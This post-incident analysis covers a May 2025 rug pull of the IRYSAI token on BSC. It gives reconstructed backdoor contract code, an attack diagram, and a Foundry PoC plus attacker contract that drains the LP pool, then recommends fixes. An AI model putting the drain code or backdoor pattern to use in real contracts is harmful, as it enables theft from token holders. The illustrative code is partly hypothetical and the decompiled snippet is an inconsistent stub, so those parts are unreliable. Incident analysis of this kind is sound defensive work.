# IRYSAI Token — Rug Pull Analysis via setTaxWallet Backdoor

| Field | Details |
|------|------|
| **Date** | 2025-05-13 |
| **Protocol** | IRYSAI Token |
| **Chain** | BSC |
| **Loss** | 69,600 USD |
| **Attacker** | Protocol Deployer (Insider) |
| **Backdoor Tx** | [0x8c637fc9...](https://bscscan.com/tx/0x8c637fc98ad84b922e6301c0b697167963eee53bbdc19665f5d122ae55234ca6) |
| **Rug Pull Tx** | [0xe9a66bad...](https://bscscan.com/tx/0xe9a66bad8975f2a7b68c74992054c84d6d80ac4c543352e23bf23740b8858645) |
| **Vulnerable Contract** | [0x746727FC8212ED49510a2cB81ab0486Ee6954444](https://bscscan.com/address/0x746727FC8212ED49510a2cB81ab0486Ee6954444) |
| **Root Cause** | Backdoor mechanism that changes the tax wallet via setTaxWallet() and then drains LP pool assets |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-05/IRYSAI_exp.sol) |

---

## 1. Vulnerability Overview

The IRYSAI token appeared to be an ordinary token with a standard tax mechanism, but concealed a backdoor through its `setTaxWallet()` function. The deployer first called `setTaxWallet()` to change the tax wallet address to their own address, then used `transferFrom()` to transfer all IRYSAI tokens from the LP pool and swap them for BNB, stealing $69,600. This was a rug pull executed in two separate transactions.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable setTaxWallet: callable only by deployer but operates as a backdoor
contract IRYSAI {
    address public taxWallet;
    address public owner;

    function setTaxWallet(address _wallet) external {
        require(msg.sender == owner, "Only owner");
        taxWallet = _wallet; // ❌ Tax wallet can be changed arbitrarily
    }

    function _transfer(address from, address to, uint256 amount) internal override {
        uint256 tax = amount * TAX_RATE / 100;
        // ❌ Tax is sent to taxWallet (which the deployer can change)
        super._transfer(from, taxWallet, tax);
        super._transfer(from, to, amount - tax);
    }
}

// Or a direct drain mechanism via transferFrom
function transferFrom(address from, address to, uint256 amount) external {
    if (msg.sender == addr3) { // ❌ Privileged address
        // Move to tax wallet then swap for BNB
        _specialTransfer(from, taxWallet, amount);
    }
    // Normal transferFrom...
}

// ✅ Correct design: fixed tax wallet or DAO governance change
contract IRYSAI {
    address public immutable taxWallet; // ✅ Immutable address
    constructor(address _taxWallet) {
        taxWallet = _taxWallet;
    }
    // No setTaxWallet() function
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: IRYSAI_decompiled.sol
contract IRYSAI {
    function setTaxWallet(address a) external view returns (address) {  // ❌ Vulnerability
        // TODO: decompiled logic not implemented
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Deployer (Insider)
  │
  ├─[Tx1: Backdoor]─► Call IRYSAI.setTaxWallet(addr3)
  │                    └─► Change tax wallet to attacker-controlled address (addr3)
  │
  ├─[Tx2: Rug Pull]─► Call transferFrom(PancakePair, addr3, balance) from addr3
  │                    └─► Move all IRYSAI tokens from LP pool to addr3
  │                    └─► Obtain BNB via PancakePair.burn() or swap
  │
  └─[Result]─► ~69,600 USD stolen
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract ContractTest is Test {
    function testPoC() public {
        // [Tx1] Change tax wallet via setTaxWallet backdoor
        vm.startPrank(addr3); // Simulate deployer address
        IIRYSAI(IRYSAI).setTaxWallet(addr3); // Tax wallet → addr3

        // [Tx2] Drain IRYSAI tokens from LP pool
        // Method 1: Directly move tokens from LP via transferFrom
        IIRYSAI(IRYSAI).transferFrom(
            PancakePair,   // from: LP pool
            addr3,         // to: attacker
            IIRYSAI(IRYSAI).balanceOf(PancakePair)
        );

        // Method 2: Or direct drain via burn() function
        // IAttacker(addr3).burn() call

        vm.stopPrank();

        // Swap to BNB
        // Swap via PancakeRouter...
    }
}

// burn function from the actual attack contract
contract Attacker {
    function burn() public {
        require(msg.sender == addr3, "only addr3");
        // Move IRYSAI from LP pool
        IIRYSAI(IRYSAI).transferFrom(
            PancakePair,
            address(this),
            IIRYSAI(IRYSAI).balanceOf(PancakePair)
        );
        // Swap IRYSAI → BNB
        IIRYSAI(IRYSAI).approve(PancakeRouter, type(uint256).max);
        // swapExactTokensForETHSupportingFeeOnTransferTokens(...)
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Rug Pull / Backdoor |
| **Attack Technique** | Tax wallet substitution + LP drain |
| **DASP Category** | Access Control |
| **CWE** | CWE-506: Embedded Malicious Code |
| **Severity** | Critical |
| **Attack Complexity** | Low (deployer insider attack) |

## 6. Remediation Recommendations

1. **Immutable Tax Wallet**: Declare `taxWallet` as `immutable` or design it to be non-modifiable.
2. **Timelock Governance**: Require a sufficient timelock (7–30 days) and community vote before any tax wallet change.
3. **LP Token Locking**: Lock LP tokens in a lock contract to prevent sudden liquidity extraction.
4. **Code Audit**: Mandate an independent smart contract audit before deployment.

## 7. Lessons Learned

- **Two-Phase Rug Pull**: Separating the backdoor setup (Tx1) from execution (Tx2) makes detection harder.
- **Danger of Tax Mechanisms**: Any function that allows changing the tax wallet is always a potential rug pull vector.
- **Importance of LP Token Locking**: If LP tokens are not locked, the deployer can remove liquidity at any time.
- **Beware AI-Themed Tokens**: Tokens with AI themes like "IRYSAI" are frequently used in rug pulls.